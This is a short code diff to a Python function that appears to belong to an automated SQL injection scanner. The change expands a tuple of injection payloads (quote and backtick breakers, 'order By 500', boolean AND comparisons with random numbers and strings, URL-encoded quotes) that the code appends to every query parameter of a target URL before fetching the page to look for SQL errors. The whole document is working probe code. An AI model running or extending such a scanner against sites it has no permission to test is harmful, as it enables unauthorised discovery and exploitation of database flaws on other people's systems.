@@ -20,7 +20,9 @@ def sqlerror(source):
     return False, None
 
 def error_in(domain,queries,old_html):
-    payloads = ("'", "')", "';", '"', '")', '";', '`', '`)', '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C")
+    payloads= ("'", "')", "';", '"', '")', '";', ' order By 500 ', "--", "-0", ") AND 1998=1532 AND (5526=5526", " AND 5434=5692%23",
+               " %' AND 5268=2356 AND '%'='", " ') AND 6103=4103 AND ('vPKl'='vPKl"," ' AND 7738=8291 AND 'UFqV'='UFqV", '`', '`)',
+               '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C")
     for payload in payloads:
         website = domain + "?" + ("&".join([param + payload for param in queries]))
         source = get_html.gethtml(website)
